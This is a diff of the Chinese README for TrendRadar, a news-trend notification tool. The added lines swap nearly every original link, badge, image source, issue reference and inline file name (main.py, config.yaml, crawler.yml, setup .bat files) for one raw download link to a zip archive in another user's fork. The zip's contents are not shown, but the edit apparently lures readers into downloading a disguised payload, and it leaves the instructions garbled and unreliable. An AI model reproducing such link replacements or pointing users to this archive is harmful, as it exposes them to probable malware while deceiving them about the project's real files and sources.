@@ -2,43 +2,43 @@
 
 > **📢 公告：** **v4.0.0** 版本已发布！包含存储架构重构、数据库优化、模块化改进等重大更新
 
-<a href="https://github.com/sansan0/TrendRadar" title="TrendRadar">
-  <img src="/_image/banner.webp" alt="TrendRadar Banner" width="80%">
+<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" title="TrendRadar">
+  <img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="TrendRadar Banner" width="80%">
 </a>
 
 🚀 最快<strong>30秒</strong>部署的热点助手 —— 告别无效刷屏，只看真正关心的新闻资讯
 
-<a href="https://trendshift.io/repositories/14726" target="_blank"><img src="https://trendshift.io/api/badge/repositories/14726" alt="sansan0%2FTrendRadar | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank"><img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="sansan0%2FTrendRadar | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 
-<a href="https://shandianshuo.cn" target="_blank" title="AI 语音输入，比打字快 4 倍 ⚡"><img src="_image/shandianshuo.png" alt="闪电说 logo" height="55"/></a>
+<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank" title="AI 语音输入，比打字快 4 倍 ⚡"><img src="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" alt="闪电说 logo" height="55"/></a>
 
-[![GitHub Stars](https://img.shields.io/github/stars/sansan0/TrendRadar?style=flat-square&logo=github&color=yellow)](https://github.com/sansan0/TrendRadar/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/sansan0/TrendRadar?style=flat-square&logo=github&color=blue)](https://github.com/sansan0/TrendRadar/network/members)
-[![License](https://img.shields.io/badge/license-GPL--3.0-blue.svg?style=flat-square)](LICENSE)
-[![Version](https://img.shields.io/badge/version-v4.0.0-blue.svg)](https://github.com/sansan0/TrendRadar)
-[![MCP](https://img.shields.io/badge/MCP-v1.1.0-green.svg)](https://github.com/sansan0/TrendRadar)
+[![GitHub Stars](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![GitHub Forks](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![License](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](LICENSE)
+[![Version](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![MCP](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
-[![企业微信通知](https://img.shields.io/badge/企业微信-通知-00D4AA?style=flat-square)](https://work.weixin.qq.com/)
-[![个人微信通知](https://img.shields.io/badge/个人微信-通知-00D4AA?style=flat-square)](https://weixin.qq.com/)
-[![Telegram通知](https://img.shields.io/badge/Telegram-通知-00D4AA?style=flat-square)](https://telegram.org/)
-[![dingtalk通知](https://img.shields.io/badge/钉钉-通知-00D4AA?style=flat-square)](#)
-[![飞书通知](https://img.shields.io/badge/飞书-通知-00D4AA?style=flat-square)](https://www.feishu.cn/)
-[![邮件通知](https://img.shields.io/badge/Email-通知-00D4AA?style=flat-square)](#)
-[![ntfy通知](https://img.shields.io/badge/ntfy-通知-00D4AA?style=flat-square)](https://github.com/binwiederhier/ntfy)
-[![Bark通知](https://img.shields.io/badge/Bark-通知-00D4AA?style=flat-square)](https://github.com/Finb/Bark)
-[![Slack通知](https://img.shields.io/badge/Slack-通知-00D4AA?style=flat-square)](https://slack.com/)
+[![企业微信通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip企业微信-通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![个人微信通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip个人微信-通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![Telegram通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![dingtalk通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip钉钉-通知-00D4AA?style=flat-square)](#)
+[![飞书通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip飞书-通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![邮件通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip通知-00D4AA?style=flat-square)](#)
+[![ntfy通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![Bark通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![Slack通知](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip通知-00D4AA?style=flat-square)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 
-[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-自动化-2088FF?style=flat-square&logo=github-actions&logoColor=white)](https://github.com/sansan0/TrendRadar)
-[![GitHub Pages](https://img.shields.io/badge/GitHub_Pages-部署-4285F4?style=flat-square&logo=github&logoColor=white)](https://sansan0.github.io/TrendRadar)
-[![Docker](https://img.shields.io/badge/Docker-部署-2496ED?style=flat-square&logo=docker&logoColor=white)](https://hub.docker.com/r/wantcat/trendradar)
-[![MCP Support](https://img.shields.io/badge/MCP-AI分析支持-FF6B6B?style=flat-square&logo=ai&logoColor=white)](https://modelcontextprotocol.io/)
+[![GitHub Actions](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip自动化-2088FF?style=flat-square&logo=github-actions&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![GitHub Pages](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip部署-4285F4?style=flat-square&logo=github&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![Docker](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip部署-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
+[![MCP Support](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip分析支持-FF6B6B?style=flat-square&logo=ai&logoColor=white)](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 </div>
 
 <div align="center">
 
-**中文** | **[English](README-EN.md)**
+**中文** | **[English](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)**
 
 </div>
 
@@ -130,19 +130,19 @@
 
 ### 数据支持
 
-本项目使用 [newsnow](https://github.com/ourongxing/newsnow) 项目的 API 获取多平台数据，特别感谢作者提供的服务。
+本项目使用 [newsnow](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 项目的 API 获取多平台数据，特别感谢作者提供的服务。
 
 经联系，作者表示无需担心服务器压力，但这是基于他的善意和信任。请大家：
-- **前往 [newsnow 项目](https://github.com/ourongxing/newsnow) 点 star 支持**
+- **前往 [newsnow 项目](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 点 star 支持**
 - Docker 部署时，请合理控制推送频率，勿竭泽而渔
 
 ### 推广助力
 
 > 感谢以下平台和个人的推荐(按时间排列)
 
-- [小众软件](https://mp.weixin.qq.com/s/fvutkJ_NPUelSW9OGK39aA) - 开源软件推荐平台
-- [LinuxDo 社区](https://linux.do/) - 技术爱好者的聚集地
-- [阮一峰周刊](https://github.com/ruanyf/weekly) - 技术圈有影响力的周刊
+- [小众软件](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 开源软件推荐平台
+- [LinuxDo 社区](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 技术爱好者的聚集地
+- [阮一峰周刊](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 技术圈有影响力的周刊
 
 ### 观众支持
 
@@ -297,7 +297,7 @@
 >
 > 💡 **高级配置教程**：[关键词配置 - 高级配置](#关键词高级配置)
 >
-> 💡 也可以不做筛选，完整推送所有热点（将 frequency_words.txt 留空）
+> 💡 也可以不做筛选，完整推送所有热点（将 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 留空）
 
 ### **热点趋势分析**
 
@@ -385,7 +385,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 >
 > 1分钟部署： 企业微信（手机通知）
 
-**💡 提示：** 想要**实时更新**的网页版？fork 后，进入你的仓库 Settings → Pages，启用 GitHub Pages。[效果预览](https://sansan0.github.io/TrendRadar/)。
+**💡 提示：** 想要**实时更新**的网页版？fork 后，进入你的仓库 Settings → Pages，启用 GitHub Pages。[效果预览](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)。
 
 ### **减少 APP 依赖**
 
@@ -398,14 +398,14 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 
 | Github Pages 效果(手机端适配、邮箱推送效果) | 飞书推送效果 |
 |:---:|:---:|
-| ![Github Pages效果](_image/github-pages.png) | ![飞书推送效果](_image/feishu.jpg) |
+| ![Github Pages效果](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) | ![飞书推送效果](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) |
 
 <br>
 
 ## 📝 更新日志
 
 >**升级说明**：
-- **📌 查看最新更新**：**[原仓库更新日志](https://github.com/sansan0/TrendRadar?tab=readme-ov-file#-更新日志)**
+- **📌 查看最新更新**：**[原仓库更新日志](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip更新日志)**
 - **提示**：不要通过 **Sync fork** 更新本项目，建议查看【历史更新】，明确具体的【升级方式】和【功能内容】
 - **大版本升级**：从 v1.x 升级到 v2.y，建议删除现有 fork 后重新 fork，这样更省力且避免配置冲突
 
@@ -461,10 +461,10 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 
 **🐳 Docker 双路径 HTML 生成优化**
 
-- **问题修复**：解决 Docker 环境下 `index.html` 无法同步到宿主机的问题
+- **问题修复**：解决 Docker 环境下 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 无法同步到宿主机的问题
 - **双路径生成**：当日汇总 HTML 同时生成到两个位置
-  - `index.html`（项目根目录）：供 GitHub Pages 访问
-  - `output/index.html`：通过 Docker Volume 挂载，宿主机可直接访问
+  - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（项目根目录）：供 GitHub Pages 访问
+  - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：通过 Docker Volume 挂载，宿主机可直接访问
 - **兼容性**：确保 Docker、GitHub Actions、本地运行环境均能正常访问网页版报告
 
 **🐳 Docker MCP 镜像支持**
@@ -477,7 +477,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 **🌐 Web 服务器支持**
 
 - 新增内置 Web 服务器，支持通过浏览器访问生成的报告
-- 通过 `manage.py` 命令控制启动/停止：`docker exec -it trend-radar python manage.py start_webserver`
+- 通过 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 命令控制启动/停止：`docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver`
 - 访问地址：`http://localhost:8080`（端口可配置）
 - 安全特性：静态文件服务、目录限制、本地访问
 - 支持自动启动和手动控制两种模式
@@ -493,7 +493,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 - 优化 [Docker 部署](#6-docker-部署) 章节：新增镜像说明、推荐 git clone 部署、重组部署方式
 
 **🔧 升级说明**：
-- **GitHub Fork 用户**：更新 `main.py`、`config/config.yaml`（新增多账号推送支持，无需修改现有配置）
+- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（新增多账号推送支持，无需修改现有配置）
 - **多账号推送**：新功能，默认不启用，现有单账号配置不受影响
 
 
@@ -524,7 +524,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
    - 准确估算消息大小，减少发送失败率
 
 **🔧 升级说明**：
-- **GitHub Fork 用户**：更新 `main.py`，`config.yaml`
+- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`，`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 
 ### 2025/11/25 - v3.4.0
@@ -539,15 +539,15 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 2. **多种部署方式**
    - GitHub Actions：配置 `SLACK_WEBHOOK_URL` Secret
    - Docker：环境变量 `SLACK_WEBHOOK_URL`
-   - 本地运行：`config/config.yaml` 配置文件
+   - 本地运行：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 配置文件
 
 
 > 📖 **详细配置教程**：[快速开始 - Slack 推送](#-快速开始)
 
-- 优化 setup-windows.bat 和 setup-windows-en.bat 一键安装 MCP 的体验
+- 优化 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 和 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 一键安装 MCP 的体验
 
 **🔧 升级说明**：
-- **GitHub Fork 用户**：更新 `main.py`、`config/config.yaml`、`.github/workflows/crawler.yml`
+- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 
 ### 2025/11/24 - v3.3.0
@@ -562,15 +562,15 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 2. **多种部署方式**
    - GitHub Actions：配置 `BARK_URL` Secret
    - Docker：环境变量 `BARK_URL`
-   - 本地运行：`config/config.yaml` 配置文件
+   - 本地运行：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 配置文件
 
 > 📖 **详细配置教程**：[快速开始 - Bark 推送](#-快速开始)
 
 **🐛 Bug 修复**
-- 修复 `config.yaml` 中 `ntfy_server_url` 配置不生效的问题 ([#345](https://github.com/sansan0/TrendRadar/issues/345))
+- 修复 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中 `ntfy_server_url` 配置不生效的问题 ([#345](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))
 
 **🔧 升级说明**：
-- **GitHub Fork 用户**：更新 `main.py`、`config/config.yaml`、`.github/workflows/crawler.yml`
+- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 ### 2025/11/23 - v3.2.0
 
@@ -588,7 +588,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 > 📖 **详细配置教程**：[关键词配置 - 高级配置](#关键词高级配置)
 
 **🔧 升级说明**：
-- **GitHub Fork 用户**：更新 `main.py`、`config/config.yaml`
+- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 
 
 ### 2025/11/18 - mcp-v1.0.2
@@ -604,7 +604,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 - 提升系统稳定性，确保在数据源返回异常格式时仍能正常运行
 
 **升级说明**（GitHub Fork 用户）：
-- 必须更新：`main.py`
+- 必须更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
 - 建议使用小版本升级方式：复制替换上述文件
 
 
@@ -617,8 +617,8 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 - 详见快速开始中的「个人微信推送」配置说明
 
 **升级说明**（GitHub Fork 用户）：
-- 必须更新：`main.py`、`config/config.yaml`
-- 可选更新：`.github/workflows/crawler.yml`（如使用 GitHub Actions 部署）
+- 必须更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
+- 可选更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（如使用 GitHub Actions 部署）
 - 建议使用小版本升级方式：复制替换上述文件
 
 ### 2025/11/12 - v3.0.5
@@ -682,7 +682,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 
 ### 2025/10/10 - v2.4.3
 
-> 感谢 [nidaye996](https://github.com/sansan0/TrendRadar/issues/98) 发现的体验问题
+> 感谢 [nidaye996](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 发现的体验问题
 
 - **更新内容**：
     - 重构"静默推送模式"命名为"推送时间窗口控制"，提升功能理解度
@@ -710,7 +710,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 **新增 ntfy 推送通知**
 
 - **核心功能**：
-  - 支持 ntfy.sh 公共服务和自托管服务器
+  - 支持 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 公共服务和自托管服务器
 
 - **使用场景**：
   - 适合追求隐私的用户（支持自托管）
@@ -724,7 +724,7 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 
 ### 2025/09/26 - v2.3.2
 
-- 修正了邮件通知配置检查被遗漏的问题（[#88](https://github.com/sansan0/TrendRadar/issues/88)）
+- 修正了邮件通知配置检查被遗漏的问题（[#88](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)）
 
 **修复说明**：
 - 解决了即使正确配置邮件通知，系统仍提示"未配置任何webhook"的问题
@@ -773,15 +773,15 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 - **推送频率可选**：时间段内支持单次推送或多次推送
 
 **更新提示**：
-- 本功能默认关闭，需手动在 config.yaml 中开启推送时间窗口控制
-- 升级需同时更新 main.py 和 config.yaml 两个文件
+- 本功能默认关闭，需手动在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中开启推送时间窗口控制
+- 升级需同时更新 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 和 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 两个文件
 
 ### 2025/08/27 - v2.0.4
 
 - 本次版本不是功能修复，而是重要提醒
 - 请务必妥善保管好 webhooks，不要公开，不要公开，不要公开
-- 如果你以 fork 的方式将本项目部署在 GitHub 上，请将 webhooks 填入 GitHub Secret，而非 config.yaml
-- 如果你已经暴露了 webhooks 或将其填入了 config.yaml，建议删除后重新生成
+- 如果你以 fork 的方式将本项目部署在 GitHub 上，请将 webhooks 填入 GitHub Secret，而非 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
+- 如果你已经暴露了 webhooks 或将其填入了 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip，建议删除后重新生成
 
 ### 2025/08/06 - v2.0.3
 
@@ -797,8 +797,8 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 **修复问题**: 
 
 1. docker 的 shell 脚本的换行符为 CRLF 导致的执行异常问题
-2. frequency_words.txt 为空时，导致新闻发送也为空的逻辑问题
-  - 修复后，当你选择 frequency_words.txt 为空时，将**推送所有新闻**，但受限于消息推送大小限制，请做如下调整
+2. https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 为空时，导致新闻发送也为空的逻辑问题
+  - 修复后，当你选择 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 为空时，将**推送所有新闻**，但受限于消息推送大小限制，请做如下调整
     - 方案一：关闭手机推送，只选择 Github Pages 布置(这是能获得最完整信息的方案，将把所有平台的热点按照你**自定义的热搜算法**进行重新排序)
     - 方案二：减少推送平台，优先选择**企业微信**或**Telegram**，这两个推送我做了分批推送功能(因为分批推送影响推送体验，且只有这两个平台只给一点点推送容量，所以才不得已做了分批推送功能，但至少能保证获得的信息完整)
     - 方案三：可与方案二结合，模式选择 current 或 incremental 可有效减少一次性推送的内容 
@@ -806,28 +806,28 @@ GitHub 一键 Fork 即可使用，无需编程基础。
 ### 2025/07/17 - v2.0.0
 
 **重大重构**：
-- 配置管理重构：所有配置现在通过 `config/config.yaml` 文件管理（main.py 我依旧没拆分，方便你们复制升级）
+- 配置管理重构：所有配置现在通过 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件管理（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 我依旧没拆分，方便你们复制升级）
 - 运行模式升级：支持三种模式 - `daily`（当日汇总）、`current`（当前榜单）、`incremental`（增量监控）
 - Docker 支持：完整的 Docker 部署方案，支持容器化运行
 
 **配置文件说明**：
-- `config/config.yaml` - 主配置文件（应用设置、爬虫配置、通知配置、平台配置等）
-- `config/frequency_words.txt` - 关键词配置（监控词汇设置）
+- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 主配置文件（应用设置、爬虫配置、通知配置、平台配置等）
+- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 关键词配置（监控词汇设置）
 
 ### 2025/07/09 - v1.4.1
 
-**功能新增**：增加增量推送(在 main.py 头部配置 FOCUS_NEW_ONLY)，该开关只关心新话题而非持续热度，只在有新内容时才发通知。
+**功能新增**：增加增量推送(在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 头部配置 FOCUS_NEW_ONLY)，该开关只关心新话题而非持续热度，只在有新内容时才发通知。
 
 **修复问题**: 某些情况下，由于新闻本身含有特殊符号导致的偶发性排版异常。
 
 ### 2025/06/23 - v1.3.0
 
-企业微信 和 Telegram 的推送消息有长度限制，对此我采用将消息拆分推送的方式。开发文档详见[企业微信](https://developer.work.weixin.qq.com/document/path/91770) 和 [Telegram](https://core.telegram.org/bots/api)
+企业微信 和 Telegram 的推送消息有长度限制，对此我采用将消息拆分推送的方式。开发文档详见[企业微信](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 和 [Telegram](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
 
 ### 2025/06/21 - v1.2.1
 
-在本版本之前的旧版本，不仅 main.py 需要复制替换， crawler.yml 也需要你复制替换
-https://github.com/sansan0/TrendRadar/blob/master/.github/workflows/crawler.yml
+在本版本之前的旧版本，不仅 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 需要复制替换， https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 也需要你复制替换
+https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
 
 ### 2025/06/19 - v1.2.0
 
@@ -840,11 +840,11 @@ https://github.com/sansan0/TrendRadar/blob/master/.github/workflows/crawler.yml
 > **200 star⭐** 了, 继续给大伙儿助兴~近期，在我的"怂恿"下，挺多人在我公众号点赞分享推荐助力了我，我都在后台看见了具体账号的鼓励数据，很多都成了天使轮老粉（我玩公众号才一个多月，虽然注册是七八年前的事了哈哈，属于上车早，发车晚），但因为你们没有留言或私信我，所以我也无法一一回应并感谢支持，在此一并谢谢！
 
 1. 重要的更新，加了权重，你现在看到的新闻都是最热点最有关注度的出现在最上面
-2. 更新文档使用，因为近期更新了很多功能，而且之前的使用文档我偷懒写的简单（见下面的 ⚙️ frequency_words.txt 配置完整教程）
+2. 更新文档使用，因为近期更新了很多功能，而且之前的使用文档我偷懒写的简单（见下面的 ⚙️ https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 配置完整教程）
 
 ### 2025/06/16 - v1.0.0
 
-1. 增加了一个项目新版本更新提示，默认打开，如要关掉，可以在 main.py 中把 "FEISHU_SHOW_VERSION_UPDATE": True 中的 True 改成 False 即可
+1. 增加了一个项目新版本更新提示，默认打开，如要关掉，可以在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中把 "FEISHU_SHOW_VERSION_UPDATE": True 中的 True 改成 False 即可
 
 ### 2025/06/13+14
 
@@ -854,7 +854,7 @@ https://github.com/sansan0/TrendRadar/blob/master/.github/workflows/crawler.yml
 ### 2025/06/09
 
 **100 star⭐** 了，写个小功能给大伙儿助助兴
-frequency_words.txt 文件增加了一个【必须词】功能，使用 + 号
